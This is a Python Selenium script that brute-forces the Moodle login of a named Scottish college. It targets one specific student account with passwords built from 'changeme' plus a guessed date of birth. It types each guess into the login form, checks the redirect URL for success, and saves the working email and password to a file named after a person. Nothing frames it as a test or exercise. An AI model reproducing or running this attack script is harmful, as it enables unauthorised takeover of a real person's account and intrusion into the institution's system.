import selenium
from selenium import webdriver
from selenium.webdriver.common.by import By
import time


day = 0
month = 0
year = 80


def attempt_login():
    driver = webdriver.Firefox()
    driver.get("https://moodle.edinburghcollege.ac.uk/login/index.php")

    with open("/home/stivens/MyCode/MoodleSubmissions/attemptlogin/GeoffreyPassword.txt", 'w') as file:
        for year in range(2000, 2001):
            for month in range(5, 13):
                for day in range(10, 32):

                    pw_day = ( str(day) if day > 9 else ( "0" + str(day) ) )

                    pw_month = ( str(month) if month > 9 else ( "0" + str(month) ) )

                    email = "ec2071915@edinburghcollege.ac.uk"
                    password = f"changeme{pw_day}{pw_month}{year}"
                    file.write(password)
                    print(password)

                    id_inputbox = driver.find_element(By.NAME, "username")
                    password_inputbox = driver.find_element(By.NAME, "password")
                    login_button = driver.find_element(By.ID, "loginbtn")

                    id_inputbox.send_keys(email)
                    time.sleep(1)
                    password_inputbox.send_keys(password)
                    time.sleep(2)
                    login_button.click()

                    time.sleep(2)

                    print(len(password))
                    print(f"Attempted password == {password}")

                    expected_url = "https://moodle.edinburghcollege.ac.uk/"
                    actual_url = driver.current_url

                    if expected_url == actual_url:
                        file.write("Email: " + email + "\n")
                        file.write("Password: " + password)
                        break
                else:
                    continue
                break

attempt_login()